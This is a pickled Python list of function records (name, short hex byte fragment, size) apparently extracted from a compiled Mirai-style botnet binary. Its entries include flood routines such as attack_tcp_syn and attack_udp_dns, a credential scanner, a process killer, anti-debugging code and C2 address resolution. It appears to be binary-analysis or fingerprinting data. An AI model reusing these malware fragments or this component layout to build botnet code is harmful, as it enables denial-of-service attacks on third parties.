(lp0
(S'_init'
p1
S''
p2
L20L
tp3
a(S'__do_global_dtors_aux'
p4
S'86962f11e690612221'
p5
L76L
tp6
a(S'frame_dummy'
p7
S'e6122221110b00d46118110e896f4ff6410909090909090909090909e34ff600'
p8
L74L
tp9
a(S'_start'
p10
S'00f62f462f07d02f040406d1410905'
p11
L30L
tp12
a(S'attack_app_http'
p13
S'864c962f6c68b673'
p14
L7300L
tp15
a(S'attack_get_opt_str'
p16
S'4c73155361041061603106a0206160318d0140338f0b090909090952600b09'
p17
L70L
tp18
a(S'attack_get_opt_ip'
p19
S'094c866c22680805d16809830b09'
p20
L40L
tp21
a(S'attack_get_opt_int'
p22
S'094c866c22680805d1f6410a830b09'
p23
L40L
tp24
a(S'attack_start'
p25
S'86962f43692fd62f7322d8510b6cff0c4ff66cf66a6900000000004809ff19931fd04009030be5d141000909090909090909090909090916d1611c15e3d1720b0909090960338d60080261041061a07361b3d3570bccaf09'
p26
L200L
tp27
a(S'attack_parse'
p28
S'8603962f1635b653692f22'
p29
L524L
tp30
a(S'attack_kill_all'
p31
S'86962fa62f00b61022db79000000000038898de54b09a2388b4f056a69'
p32
L76L
tp33
a(S'add_attack'
p34
S'86962fa62f13b64c6b01226c0be5d9689004c2d02145a27561021c134286014f10f6f669'
p35
L84L
tp36
a(S'attack_init'
p37
S'861212224800110be4d54802100be4d54803d54804d548054806e4d54807e4d5480a4ff600'
p38
L74L
tp39
a(S'attack_gre_eth'
p40
S'864c962f73a62f6c694f5ed10be5dae7830be66059d703930c0b9383090be7600193830be6604fd706e61f4a83834ad70b6e93838840e23212e64a010e4ce083e64a003fd1e60b6b023b030be6881f0209fc7fd06d01381d1200030b77888f0c0924f7070040e01d7ded617dcd10be108d187134fc007d604272611c18411bfd516c357241182d1c18471b77ec725040e7370761711d6cfc0619e04cfc002ce131532d43386c61182338194118421b2b09f8a8004000ff00c941004000a5400000000000000000000000000060e0035601297929021ddf049a51035008970808716315e1731934251f05e00371e06221710658e00738612171007121727a210671e321e1225218f61702572f7691837327731ffb7632508311285175528374e1225000439210'
p41
L1458L
tp42
a(S'attack_gre_ip'
p43
S'864c962f73a62f6c694f5ad11f0be5dae7830be66055d703930a0b9383071f0be7600193830be6604bd706e60d938346d70b6d938380e23212e64a010e44e083e64a003b9383124a031f0237d0e54006e6881f0209fc7fd06e01241f1e041200030b77888feca0f552fd0700'
p44
L1328L
tp45
a(S'attack_tcp_stomp'
p46
S'864c962f73a62f6c694fc2db3f'
p47
L1742L
tp48
a(S'attack_tcp_ack'
p49
S'864c962f73a62f6c694f98d11f0be5dae7830be663d70393838340e74a036154e0e7930be6638706e6938383834a0383804a03830b0be6830c0be7830de7830e1f0be783000b6b1f4a0040e60093830be7e7370193830be6e13111e64a010e63938312401940e60c025cd0e54006e6e78837020209fc7f30e1101203e5d0e64078ffa2ed63dd32e112128de0512cfd0328002ff1625ce0e661001cfc3d4160e04c795e1b5140e706fc37fd50194b23c9011b'
p50
L1470L
tp51
a(S'attack_tcp_syn'
p52
S'864c962f73a62f6c694fccd10be5dae7830be648e0d70356938383090be76150e0e7930be654e0d706e6938383b70b6e9383b40b6c93830a0be7830b0be783000b6b0c0be7830de7830e1f0be7831f4a0040e600939cd00be6e737090299d0e54006e6e18831118f1ea294d06d01301d1200030b77888f08fd06f7e140e61f1ded15160716180128fd0540e0305e5d63e535507c334e001b73181b61184b1b03503c19c90218502b0101fd500102'
p53
L1374L
tp54
a(S'attack_udp_plain'
p55
S'8673962f6c692fc3e622d17f1fda4104d202db4204b393830b6e0d830be660b393830be60de64a010e600005501bb02c192a0120fc025b2c184b1b15a0fc06f450006c6159181f196a1b021f62015ca0090909fd016011f7e4023d761f620be6610310160e1388240211b1001a320b00322fd2d342a021e64319416d487c3b288b7b1b7d2527232341184719427b2b3b11f61fd1e604701f0b7a50c08d79d1d441015103500150d130d2420998af010909090909344ff66df6f6690002a8004000ff0040000040000000ff00091a15ea50189e08d36083d3970b793a'
p56
L586L
tp57
a(S'attack_udp_generic'
p58
S'864c962f73a62f6c696e22d1da41040093830be6607b0393090b938305e7600093830be6607106e60c0b9383061f0be683c9970b6c9383010b6b6093831f4a19071f02'
p59
L1022L
tp60
a(S'attack_udp_vse'
p61
S'864c962f73a62f6c694f7bcc7f1f511f0be5da030be6608303061f0b8304040be7608300080b836b0b6e83c997930b6cd168d0402c03d0e4e54011ff0309fc7fd06bf87b1b1200030b77888f61a156fd026c8d462d1f1f1b1f8a0124fc00fa590c28fc024c18e819422b5218422b1b3fd6017a0b48bf50180808371e06d3611462622f019163731963cb'
p62
L926L
tp63
a(S'attack_udp_dns'
p64
S'864c962f73a62f6c694fa59154da3f54d1511f0be583030be6609383080be683040be66093830a0be66093830b0be68305e683090b6e93830c0b6d03080083933840e23212431ee4d9e44900030be5d603461ee4483dd04d96b30b03d04083471fe4e4490003d003d0401fe460ff1e'
p65
L1544L
tp66
a(S'checksum_generic'
p67
S'01163500014561'
p68
L54L
tp69
a(S'checksum_tcpudp'
p70
S'86011737962f736d6900015561'
p71
L136L
tp72
a(S'mem_exists'
p73
S'5737105360ff40616c02318d73e37560ff0b00090909090909090909090930ec'
p74
L76L
tp75
a(S'killer_kill'
p76
S'02122b'
p77
L10L
tp78
a(S'killer_kill_by_port'
p79
S'8600962f4d692f2291d891fc3496bb349400b7fc3c34965edd481cac9400af91fc34960b34909c6118e230e5492d1be110100b0b023050d8e448000be448094dd00be5888f6b93604adefc384e838b63238d603a'
p80
L1276L
tp81
a(S'killer_init'
p82
S'86962fa62fb6'
p83
L1448L
tp84
a(S'anti_gdb_entry'
p85
S'0203220b09'
p86
L10L
tp87
a(S'teardown_connection'
p88
S'8622d88d06d04009ff124f04f64101'
p89
L34L
tp90
a(S'ensure_single_instance'
p91
S'8601962f02a62f01b6'
p92
L300L
tp93
a(S'main'
p94
S'86962fa62fb6'
p95
L2224L
tp96
a(S'resolve_cnc_addr'
p97
S'86962fa62fb62a'
p98
L178L
tp99
a(S'rand_next'
p100
S'0c0b0c62d4617d0c1a4263607219526132ede1477a3a2a0200'
p101
L52L
tp102
a(S'rand_str'
p103
S'861568b60e'
p104
L116L
tp105
a(S'rand_alphastr'
p106
S'8621962f5368b622d07f6a7ad540a38bdbe1388b4b09936263e7600940ac0177600410198f727848e97f4ff66a69000000000000000000000000000000004b'
p107
L164L
tp108
a(S'rand_init'
p109
g2
L64L
tp110
a(S'resolv_skip_name'
p111
S'33001240611c288d1340611c2c7c5c34611c288fe0880000000000208f746101de0909090909090962710b09'
p112
L106L
tp113
a(S'resolv_entries_free'
p114
S'8648242f43684154d9014f93618368090909090909090909090909094ff668'
p115
L74L
tp116
a(S'resolv_domain_to_hostname'
p117
S'1b86436822405369a00923000179'
p118
L110L
tp119
a(S'resolv_lookup'
p120
S'8608962f4368b6'
p121
L1014L
tp122
a(S'consume_any_prompt'
p123
S'4652ff422b1c10888d888d0e8d8810611a10888d88'
p124
L100L
tp125
a(S'can_consume'
p126
S'46511c5c1c3400'
p127
L14L
tp128
a(S'scanner_kill'
p129
S'02122b'
p130
L10L
tp131
a(S'deobf'
p132
S'865368a62f22404369d04001039303016800130271e33822'
p133
L78L
tp134
a(S'add_auth_entry'
p135
S'8604962fa62fb66d6b'
p136
L172L
tp137
a(S'setup_connection'
p138
S'8600962f00a62f436a2f2250'
p139
L152L
tp140
a(S'recv_strip_null'
p141
S'0a862240536803e0e301218b01328b4ff60060'
p142
L42L
tp143
a(S'scanner_init'
p144
S'86962fa62fb6'
p145
L5476L
tp146
a(S'table_retrieve_val'
p147
S'0343601d250371611d600b09'
p148
L30L
tp149
a(S'toggle_obf'
p150
S'4c1b082f6c962f1c19637991611d'
p151
L112L
tp152
a(S'add_entry'
p153
S'864c680d2fb62240536ad16b031d38284ff66a69'
p154
L62L
tp155
a(S'table_init'
p156
S'8603d822481ee6e4d5480212630be6e4d548020261d548'
p157
L412L
tp158
a(S'util_strlen'
p159
S'406118068de07001218f707000'
p160
L24L
tp161
a(S'util_strncmp'
p162
S'86962fa62f63d92f2249536cc30b68a3e04ff6f6690000000000007a60ff016110f6e000000000af01'
p163
L100L
tp164
a(S'util_strcmp'
p165
S'86962f18a62f436a2f2249536b0011f66a69e0000000000000000000007088896110e60170888b4ff66a69'
p166
L102L
tp167
a(S'util_memcpy'
p168
S'68e00101308b00'
p169
L20L
tp170
a(S'util_strcpy'
p171
S'860b962f53690803930341014f83f668'
p172
L46L
tp173
a(S'util_zero'
p174
S'5825001401308b00'
p175
L20L
tp176
a(S'util_itoa'
p177
S'8668a62f632f'
p178
L220L
tp179
a(S'util_memsearch'
p180
S'5737860c156809090909090909098fe3a00909090909090909090909000135833301318f78378f7373af'
p181
L100L
tp182
a(S'util_stristr'
p183
S'86536823a62f436a2f2240630315'
p184
L150L
tp185
a(S'util_atoi'
p186
S'8643962fa62f536a2f'
p187
L358L
tp188
a(S'util_fdgets'
p189
S'864368a62fb6632f536cd62f436de61222b3010b6a888f78793c8b8f894fd36ef66cf66a6900000000000000af00'
p190
L100L
tp191
a(S'util_local_addr'
p192
S'8610962f22d07f61d42f11400900121402020be68869d1'
p193
L102L
tp194
a(S'__sdivsi3_i4'
p195
S'5a442d230b'
p196
L14L
tp197
a(S'__udivsi3_i4'
p198
S'0116351a4406'
p199
L40L
tp200
a(S'fcntl'
p201
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf11312772271763304017253637362040216332705d04009a0407e60138230638f68098be32060407e6f4ff668'
p202
L164L
tp203
a(S'fcntl64'
p204
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf11312772271763304017218226012138230638f68098be320336f4ff668'
p205
L144L
tp206
a(S'chdir'
p207
S'860ce6334f6e118230638f68098be32060e34ff668'
p208
L50L
tp209
a(S'close'
p210
S'8606e32f334f6e118230638f68098be32060e34ff668'
p211
L50L
tp212
a(S'fork'
p213
S'8602e6334f6e108230638f68098be32060e34ff668'
p214
L50L
tp215
a(S'getpid'
p216
S'8614e6334f6e108230638f68098be32060e34ff668'
p217
L50L
tp218
a(S'getppid'
p219
S'8640e32f334f6e108230638f68098be32060e34ff668'
p220
L50L
tp221
a(S'ioctl'
p222
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf113127722717633040172e36013722712c38230638f68098be320336f4ff668'
p223
L144L
tp224
a(S'kill'
p225
S'862560226e128230638f68098be32060e34ff668'
p226
L50L
tp227
a(S'open'
p228
S'86f8e12f536883e30419686120711540c9bb71208a9bf1f87171f17b4a5b132c331172e07311333053110122120533c38230638f68098be320336f4ff668'
p229
L156L
tp230
a(S'creat'
p231
S'5304056ee3f64109'
p232
L18L
tp233
a(S'prctl'
p234
S'86e622936ee315308f68098b20e06f4ff668'
p235
L46L
tp236
a(S'read'
p237
S'8603e6334f6e138230638f68098be32060e34ff668'
p238
L50L
tp239
a(S'readlink'
p240
S'8655e32f334f6e138230638f68098be32060e34ff668'
p241
L50L
tp242
a(S'select'
p243
S'86e622936ee315308f68098b20e06f4ff668'
p244
L46L
tp245
a(S'setsid'
p246
S'8642e32f334f6e108230638f68098be32060e34ff668'
p247
L50L
tp248
a(S'sigprocmask'
p249
S'8658250a16348bd0400916e120a00833c38230638f68098be32060e34ff668'
p250
L76L
tp251
a(S'time'
p252
S'860d60226e118230638f68098be32060e34ff668'
p253
L50L
tp254
a(S'unlink'
p255
S'860ae6334f6e118230638f68098be32060e34ff668'
p256
L50L
tp257
a(S'write'
p258
S'8604e6334f6e138230638f68098be32060e34ff668'
p259
L50L
tp260
a(S'closedir'
p261
S'86962fa62f436a2f2260'
p262
L108L
tp263
a(S'opendir'
p264
S'86962fa62f00e622d0406e118f680b118be540011189ea230b007ed0403008178d6ae11052111229257110d0e4201a8fe5d141a30bea0c1205d0747e60e34ff66a69'
p265
L186L
tp266
a(S'readdir'
p267
S'864368e643697f6e1ae30b190b915292513117d0560b00e1a011915293582c816134'
p268
L122L
tp269
a(S'__errno_location'
p270
S'03e66ee3f600'
p271
L14L
tp272
a(S'clock'
p273
S'86e622d07f6e0be1e210d00819e34ff668'
p274
L46L
tp275
a(S'memcpy'
p276
S'632068c830e18d3175'
p277
L636L
tp278
a(S'memmove'
p279
S'864361962f58312f632f4368f87f6e411e02e1e1014b6063c903100120'
p280
L978L
tp281
a(S'memset'
p282
S'e607e16e638f5c63416b634303ff72600308f8'
p283
L124L
tp284
a(S'inet_addr'
p285
S'e622d07f6e0b0803c45004e34ff600'
p286
L38L
tp287
a(S'accept'
p288
S'e622d07f6e42511e0540e30ce34ff600'
p289
L34L
tp290
a(S'bind'
p291
S'e622d07f6e42511e02620b0ce34ff600'
p292
L34L
tp293
a(S'connect'
p294
S'e622d07f6e42511e03620b0ce34ff600'
p295
L34L
tp296
a(S'getsockname'
p297
S'e622d07f6e42511e06e41e0b0ce34ff600'
p298
L34L
tp299
a(S'getsockopt'
p300
S'e622d07f6ee742e46273140b14e34ff600'
p301
L40L
tp302
a(S'listen'
p303
S'e622d07f6ee3c8e34e114004086f4ff600'
p304
L36L
tp305
a(S'recv'
p306
S'e622d07f6e42511e0a62730b106f4ff600'
p307
L36L
tp308
a(S'recvfrom'
p309
S'e6227fd06ee8e41ee91e7325186f4ff600'
p310
L44L
tp311
a(S'send'
p312
S'e622d07f6e42511e0962730b106f4ff600'
p313
L36L
tp314
a(S'sendto'
p315
S'e6227fd06ee8e41ee91e7325186f4ff600'
p316
L44L
tp317
a(S'setsockopt'
p318
S'e622d07f6ee7420ee41e6273140b14e34ff600'
p319
L40L
tp320
a(S'socket'
p321
S'e622d07f6e42511e01620b0ce34ff600'
p322
L34L
tp323
a(S'raise'
p324
S'86436822406e05e34ff668'
p325
L32L
tp326
a(S'sigaddset'
p327
S'e615'
p328
L50L
tp329
a(S'sigemptyset'
p330
S'e60005960b6e00e34ff600'
p331
L26L
tp332
a(S'signal'
p333
S'865360962fffe622911806'
p334
L156L
tp335
a(S'__sigismember'
p336
S'536373e1601d6108601fe701013de6606ee3f600'
p337
L44L
tp338
a(S'__sigaddset'
p339
S'5360ffe16242014c326e22c90d21226ff600'
p340
L40L
tp341
a(S'__sigdelset'
p342
S'5360ffe16343014c336e1fc9324200276221236ff600'
p343
L42L
tp344
a(S'malloc'
p345
S'8648242f43622f227f'
p346
L222L
tp347
a(S'calloc'
p348
S'8648242f5363e62208'
p349
L86L
tp350
a(S'free'
p351
S'8648242fa62fb6'
p352
L208L
tp353
a(S'realloc'
p354
S'865825b6436b53e622'
p355
L234L
tp356
a(S'__heap_alloc'
p357
S'52'
p358
L98L
tp359
a(S'__heap_alloc_at'
p360
S'4262762f25633156318d2019021b128901225218030d24a032055228d8336ff600'
p361
L102L
tp362
a(S'__heap_link_free_area'
p363
S'e668155116027800f600'
p364
L34L
tp365
a(S'__heap_link_free_area_after'
p366
S'e6686e511601620b09'
p367
L26L
tp368
a(S'__heap_free'
p369
S'865360962f6c302f0022685231892871a0830c06318d3169238d610c1032560d57780e8d72280c100873730ed1410905d10b9228a0037962930b9360e34ff669'
p370
L166L
tp371
a(S'abort'
p372
S'86e622913018305c980b6eec38e2a0'
p373
L200L
tp374
a(S'atol'
p375
S'0400e60a6ee3f64109'
p376
L18L
tp377
a(S'strtol'
p378
S'0301e66ee3f64109'
p379
L16L
tp380
a(S'_stdlib_strto_l'
p381
S'864368a62fb6'
p382
L304L
tp383
a(S'sleep'
p384
S'8648242fa62fb6e622911802009893200001ff611141f98d8d1148d032391f124093118fe49843d040836b0be520932001ff611141f98d94113534401c11'
p385
L332L
tp386
a(S'__uClibc_fini'
p387
S'86152f1822486e05d1601e014109'
p388
L86L
tp389
a(S'__pthread_return_0'
p390
S'e6006ee3f600'
p391
L14L
tp392
a(S'_pthread_cleanup_push_defer'
p393
S'e66ee3f600'
p394
L12L
tp395
a(S'__check_one_fd'
p396
S'865368e64369406eff090b903089d14109e34ff669'
p397
L56L
tp398
a(S'__uClibc_init'
p399
S'e622d26118120c121222010a1804e34ff64109e34ff600'
p400
L60L
tp401
a(S'sbrk'
p402
S'86962fa62f436a2f'
p403
L72L
tp404
a(S'__socketcall'
p405
S'86e32f334f6e128230638f68098be32060e34ff668'
p406
L50L
tp407
a(S'_exit'
p408
S'86962f43696e0c01931116308f68098b20af09'
p409
L40L
tp410
a(S'fstat'
p411
S'866ce32f332f53697f6ee3128230638f68098be3202333d10b407e60e34ff66a69'
p412
L80L
tp413
a(S'__getdents'
p414
S'865368b6'
p415
L120L
tp416
a(S'__getdents64'
p417
S'86632f06712f092f082f536b632f2293'
p418
L248L
tp419
a(S'getegid'
p420
S'86e622936e33c38230638f68098be32060e34ff668'
p421
L50L
tp422
a(S'geteuid'
p423
S'86e622936e33c38230638f68098be32060e34ff668'
p424
L50L
tp425
a(S'getgid'
p426
S'86e622936e33c38230638f68098be32060e34ff668'
p427
L50L
tp428
a(S'getuid'
p429
S'86e622936e33c38230638f68098be32060e34ff668'
p430
L50L
tp431
a(S'lseek64'
p432
S'86632f73e653227fe9e323c31c16308f68098b20a003041ae3c81f51086f4ff669'
p433
L86L
tp434
a(S'nanosleep'
p435
S'86e622936e33c38230638f68098be32060e34ff668'
p436
L50L
tp437
a(S'times'
p438
S'862be6334f6e118230638f68098be32060e34ff668'
p439
L50L
tp440
a(S'__xstat64_conv'
p441
S'8660e62f5368b683e5d04f0b6e9d5193635b8340761872500010916121619455122d187754181816799b529551349c531516b6a718180e186f4ff66bf668'
p442
L128L
tp443
a(S'__xstat_conv'
p444
S'8658e62f5368b683e5d06e0b7b519363187793601b0c9651936a731c0e7a512d1d51000118621b612d6154181b7627181841186f4ff66bf668'
p445
L138L
tp446
a(S'inet_aton'
p447
S'8648242fa62f536a2f'
p448
L194L
tp449
a(S'sigaction'
p450
S'865825a62f00b6632f436b3b6e385661ec38123393617c13121818e614b30be72a8d690ed06104180b7553a37111119793607ce34ff66bf668'
p451
L144L
tp452
a(S'_dl_aux_init'
p453
S'475205536e220332e3f600'
p454
L24L
tp455
a(S'_brk'
p456
S'862d60226e118230638f68098be32060e34ff668'
p457
L50L
tp458
a(S'__init_brk'
p459
S'860d612221d040000802068bd040090c1201e34ff668'
p460
L56L
tp461
a(S'__syscall_rt_sigaction'
p462
S'86e622936e33c38230638f68098be32060e34ff668'
p463
L50L
tp464
a(S'__do_global_ctors_aux'
p465
S'8609e6'
p466
L38L
tp467
a(S'_fini'
p468
g2
L20L
tp469
a.